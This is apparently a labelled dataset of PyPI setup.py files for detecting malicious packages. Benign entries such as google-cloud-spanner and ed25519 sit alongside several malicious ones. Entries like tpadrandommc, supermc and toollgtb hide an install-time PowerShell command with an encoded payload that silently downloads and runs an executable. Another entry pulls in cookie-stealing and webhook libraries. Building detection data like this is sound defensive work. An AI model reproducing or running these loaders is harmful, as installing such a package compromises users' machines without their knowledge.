[\"apache-airflow==1.10.9\"],\n        airflow_1_10_10=requirements_for_airflow + [\"apache-airflow==1.10.10\"],\n        airflow_1_10_11=requirements_for_airflow + [\"apache-airflow==1.10.11\"],\n        airflow_1_10_12=requirements_for_airflow + [\"apache-airflow==1.10.12\"],\n        airflow_1_10_13=requirements_for_airflow + [\"apache-airflow==1.10.13\"],\n        airflow_1_10_14=requirements_for_airflow + [\"apache-airflow==1.10.14\"],\n        airflow_1_10_15=requirements_for_airflow + [\"apache-airflow==1.10.15\"],\n        airflow_2_0_2=[\n            # This is only used to build Docker image for integration tests.\n            \"WTForms<2.3.0\",\n            \"psycopg2-binary>=2.7.4\",\n            \"apache-airflow==2.0.2\",\n            \"apache-airflow-providers-apache-spark==1.0.3\",\n            # Airflow 2.0 installs versions 3.3.5 which has bad dependency to newer version of importlib-metadata\n            \"Markdown==3.3.4\",\n            # dbnd_snowflake depends on azure-core which depends on snowflake-connector-python<2.6.0, which depends on\n            # azure-storage-blob<13.0.0 which depends on azure-core <2.0.0,>=1.15.0 which needs typing-extensions>=4.0.1\n            # which conflicts with Airflow 2.0.2, so fixed on a good version\n            \"azure-core==1.22.1\",\n        ],\n        airflow_2_2_3=[\n            # This is only used to build Docker image for integration tests.\n            \"WTForms<2.3.0\",\n            \"psycopg2-binary>=2.7.4\",\n            \"apache-airflow==2.2.3\",\n            # Airflow 2.0 installs versions 3.3.5 which has bad dependency to newer version of importlib-metadata\n            \"Markdown==3.3.4\",\n            \"apache-airflow-providers-apache-spark\",\n            # Airflow 2.2 requires lower version of SQLalchemy to be installed\n            \"SQLAlchemy<1.4\",\n        ],\n        airflow_2_3_0=[\n            # This is only used to build Docker image for integration tests.\n            \"WTForms<2.3.0\",\n            \"psycopg2-binary>=2.7.4\",\n            \"apache-airflow==2.2.3\",\n            # Airflow 2.0 installs versions 3.3.5 which has bad dependency to newer version of importlib-metadata\n            \"Markdown==3.3.4\",\n            \"apache-airflow-providers-apache-spark\",\n            # Airflow 2.2 requires lower version of SQLalchemy to be installed\n            \"SQLAlchemy<1.4\",\n        ],\n        airflow=requirements_for_airflow + [\"apache-airflow==1.10.10\"],\n        tests=[\n            # # airflow support\n            \"dbnd_test_scenarios==\" + version,\n            \"pytest==4.5.0\",\n            \"boto3\",\n            \"mock\",\n            \"sh\",\n        ],\n    ),\n    entry_points={\"dbnd\": [\"dbnd-airflow = dbnd_airflow._plugin\"]},\n)\n", "target": 0}
{"idx": "google-cloud-spanner-3.17.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-spanner\"\ndescription = \"Cloud Spanner API client library\"\nversion = \"3.17.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"google-cloud-core >= 1.4.1, < 3.0dev\",\n    \"grpc-google-iam-v1 >= 0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev, != 1.19.6\",\n    \"sqlparse >= 0.3.0\",\n    \"packaging >= 14.3\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\n    \"tracing\": [\n        \"opentelemetry-api >= 1.1.0\",\n        \"opentelemetry-sdk >= 1.1.0\",\n        \"opentelemetry-instrumentation >= 0.20b0, < 0.23dev\",\n    ],\n    \"libcst\": \"libcst >= 0.2.5\",\n}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-spanner\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "drf-spectacular-0.23.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport shutil\nimport sys\n\nfrom setuptools import setup\n\nname = 'drf-spectacular'\npackage = 'drf_spectacular'\ndescription = 'Sane and flexible OpenAPI 3 schema generation for Django REST framework'\nurl = 'https://github.com/tfranzel/drf-spectacular'\nauthor = 'T. Franzel'\nauthor_email = 'tfranzel@gmail.com'\nlicense = 'BSD'\n\nwith open('README.rst') as readme:\n    long_description = readme.read()\n\nwith open('requirements/base.txt') as fh:\n    requirements = [r for r in fh.read().split('\\n') if not r.startswith('#')]\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\",\n                     init_py, re.MULTILINE).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [\n        dirpath for dirpath, dirnames, filenames in os.walk(package)\n        if os.path.exists(os.path.join(dirpath, '__init__.py'))\n    ]\n\n\nversion = get_version(package)\n\n\nif sys.argv[-1] == 'publish':\n    if os.system(\"pip freeze | grep twine\"):\n        print(\"twine not installed.\\nUse `pip install twine`.\\nExiting.\")\n        sys.exit(1)\n    os.system(\"python setup.py sdist bdist_wheel\")\n    if os.system(\"twine check dist/*\"):\n        print(\"twine check failed. Packages might be outdated.\")\n        print(\"Try using `pip install -U twine wheel`.\\nExiting.\")\n        sys.exit(1)\n    if os.system(\"twine upload dist/*\"):\n        print(\"failed to upload package\")\n        sys.exit(1)\n    if os.environ.get('CI'):\n        os.system(\"git config user.name github-actions\")\n        os.system(\"git config user.email github-actions@github.com\")\n    os.system(f\"git tag -a {version} -m 'version {version}'\")\n    if os.system(\"git push --tags\"):\n        print(\"failed pushing release tag\")\n        sys.exit(1)\n    shutil.rmtree('dist')\n    shutil.rmtree('build')\n    shutil.rmtree('drf_spectacular.egg-info')\n    sys.exit()\n\n\nsetup(\n    name=name,\n    version=version,\n    url=url,\n    license=license,\n    description=description,\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    include_package_data=True,\n    python_requires=\">=3.6\",\n    install_requires=requirements,\n    extras_require={\n        \"offline\": [\"drf-spectacular-sidecar\"],\n        \"sidecar\": [\"drf-spectacular-sidecar\"],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Documentation',\n        'Topic :: Software Development :: Code Generators',\n    ],\n    project_urls={\n        'Source': 'https://github.com/tfranzel/drf-spectacular',\n        'Documentation': 'https://drf-spectacular.readthedocs.io',\n    },\n)\n", "target": 0}
{"idx": "tpadrandommc-9.66", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpadrandommc',\n    packages = ['modlib'],\n    version = '5.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqnvidiaadram-1.94", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiaadram',\n    packages = ['modlib'],\n    version = '2.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "supermc-5.74", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'supermc',\n    packages = ['modlib'],\n    version = '8.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gamegame-4.12", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'gamegame',\n    packages = ['modlib'],\n    version = '1.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ed25519-1.5", "func": "from __future__ import print_function\nimport sys, os, timeit\nfrom distutils.core import setup, Extension, Command\nfrom distutils.util import get_platform\nimport versioneer\n\n\nLONG_DESCRIPTION=\"\"\"\\\nPython bindings to the Ed25519 public-key signature system.\n\nThis offers a comfortable python interface to a C implementation of the\nEd25519 public-key signature system (http://ed25519.cr.yp.to/), using the\nportable 'ref' code from the 'SUPERCOP' benchmarking suite.\n\nThis system provides high (128-bit) security, short (32-byte) keys, short\n(64-byte) signatures, and fast (2-6ms) operation. Please see the README for\nmore details.\n\n## Not Recommended For New Applications: Use pynacl Instead\n\nFor new applications, I recommend you use\n[`pynacl`](https://github.com/pyca/pynacl) instead of this repository.\n`PyNaCl` is larger and takes longer to build (it contains the complete\nNaCl/libsodium library, not just the ed25519 portion), but it is\nwell-maintained by the diligent and conscientious PyCA team, whereas I've\nallowed this repository to languish. `PyNaCl` is also about 10-20 times\nfaster. A guide for migration fron `python-ed25519` to `PyNaCl` is included\nbelow.\n\"\"\"\n\nsources = [\"src/ed25519-glue/ed25519module.c\"]\nsources.extend([\"src/ed25519-supercop-ref/\"+s\n                for s in os.listdir(\"src/ed25519-supercop-ref\")\n                if s.endswith(\".c\") and s!=\"test.c\"])\n\nm = Extension(\"ed25519._ed25519\",\n              include_dirs=[\"src/ed25519-supercop-ref\"], sources=sources)\n\ncommands = versioneer.get_cmdclass().copy()\n\nclass Test(Command):\n    description = \"run tests\"\n    user_options = []\n    def initialize_options(self):\n        pass\n    def finalize_options(self):\n        pass\n    def setup_path(self):\n        # copied from distutils/command/build.py\n        self.plat_name = get_platform()\n        plat_specifier = \".%s-%s\" % (self.plat_name, sys.version[0:3])\n        self.build_lib = os.path.join(\"build\", \"lib\"+plat_specifier)\n        sys.path.insert(0, self.build_lib)\n    def run(self):\n        self.setup_path()\n        import unittest\n        test = unittest.defaultTestLoader.loadTestsFromName(\"ed25519.test_ed25519\")\n        runner = unittest.TextTestRunner(verbosity=2)\n        result = runner.run(test)\n        sys.exit(not result.wasSuccessful())\ncommands[\"test\"] = Test\n\nclass KnownAnswerTest(Test):\n    description = \"run known-answer-tests\"\n    def run(self):\n        self.setup_path()\n        import unittest\n        test = unittest.defaultTestLoader.loadTestsFromName(\"test_ed25519_kat\")\n        runner = unittest.TextTestRunner(verbosity=2)\n        result = runner.run(test)\n        sys.exit(not result.wasSuccessful())\ncommands[\"test_kat\"] = KnownAnswerTest\n\n\nclass Speed(Test):\n    description = \"run benchmark suite\"\n    def run(self):\n        self.setup_path()\n\n        def do(setup_statements, statement):\n            # extracted from timeit.py\n            t = timeit.Timer(stmt=statement,\n                             setup=\"\\n\".join(setup_statements))\n            # determine number so that 0.2 <= total time < 2.0\n            for i in range(1, 10):\n                number = 10**i\n                x = t.timeit(number)\n                if x >= 0.2:\n                    break\n            return x / number\n\n        def abbrev(t):\n            if t > 1.0:\n                return \"%.3fs\" % t\n            if t > 1e-3:\n                return \"%.2fms\" % (t*1e3)\n            return \"%.2fus\" % (t*1e6)\n\n        S1 = \"import ed25519; msg=b'hello world'\"\n        S2 = \"sk,vk = ed25519.create_keypair()\"\n        S3 = \"sig = sk.sign(msg)\"\n        S4 = \"vk.verify(sig, msg)\"\n\n        generate = do([S1], S2)\n        sign = do([S1, S2], S3)\n        verify = do([S1, S2, S3], S4)\n\n        print(\"generate: %s\" % abbrev(generate))\n        print(\"sign: %s\" % abbrev(sign))\n        print(\"verify: %s\" % abbrev(verify))\n\ncommands[\"speed\"] = Speed\n\nsetup(name=\"ed25519\",\n      version=versioneer.get_version(),\n      description=\"Ed25519 public-key signatures\",\n      long_description=LONG_DESCRIPTION,\n      author=\"Brian Warner\",\n      author_email=\"warner-python-ed25519@lothar.com\",\n      license=\"MIT\",\n      url=\"https://github.com/warner/python-ed25519\",\n      classifiers=[\n          \"Development Status :: 5 - Production/Stable\",\n          \"Intended Audience :: Developers\",\n          \"License :: OSI Approved :: MIT License\",\n          \"Programming Language :: Python\",\n          \"Programming Language :: Python :: 2.6\",\n          \"Programming Language :: Python :: 2.7\",\n          \"Programming Language :: Python :: 3.3\",\n          \"Programming Language :: Python :: 3.4\",\n          \"Topic :: Security :: Cryptography\",\n          ],\n      ext_modules=[m],\n      packages=[\"ed25519\"],\n      package_dir={\"ed25519\": \"src/ed25519\"},\n      scripts=[\"bin/edsig\"],\n      cmdclass=commands,\n      )\n", "target": 0}
{"idx": "libpeppingpyw-1.32", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpeppingpyw',\n    packages = ['modlib'],\n    version = '3.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-warnings-0.2.1", "func": "#!/usr/bin/env python\n# setup.py generated by flit for tools that don't yet use PEP 517\n\nfrom distutils.core import setup\n\npackages = \\\n['flake8_warnings', 'flake8_warnings._extractors']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['astroid']\n\nextras_require = \\\n{'lint': ['flake8-length', 'mypy', 'isort'], 'test': ['pytest']}\n\nentry_points = \\\n{'flake8.extension': ['WS0 = flake8_warnings:Flake8Checker']}\n\nsetup(name='flake8-warnings',\n      version='0.2.1',\n      description='Linter (flake8, pylint, custom CLI) for finding usage of deprecated functions.',\n      author=None,\n      author_email='Gram <gram@orsinium.dev>',\n      url=None,\n      packages=packages,\n      package_data=package_data,\n      install_requires=install_requires,\n      extras_require=extras_require,\n      entry_points=entry_points,\n      python_requires='>=3.6',\n     )\n", "target": 0}
{"idx": "djangorestframework-queryfields-1.0.0", "func": "from setuptools import setup, find_packages\n\n\nclassifiers = [\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 3',\n    'Topic :: Software Development :: Libraries',\n    'Intended Audience :: Developers',\n    'Framework :: Django',\n]\n\nwith open(\"README.rst\") as f:\n    long_description = f.read()\n\nsetup(\n    name='djangorestframework-queryfields',\n    version='1.0.0',\n    description='Serialize a partial subset of fields in the API',\n    long_description=long_description,\n    packages=find_packages(exclude=['tests']),\n    author='Wim Glenn',\n    author_email='hey@wimglenn.com',\n    url='https://github.com/wimglenn/djangorestframework-queryfields',\n    classifiers=classifiers,\n    extras_require={\n        'dev': ['setuptools', 'wheel', 'pytest-django', 'djangorestframework', 'django', 'mock_django']\n    },\n)\n", "target": 0}
{"idx": "libstudystring-9.94", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstudystring',\n    packages = ['modlib'],\n    version = '6.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "xolotabiamysla-0.0.0", "func": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolotabiamysla', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)", "target": 1}
{"idx": "toollgtb-2.65", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'toolLGTB',\n    packages = ['modlib'],\n    version = '3.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
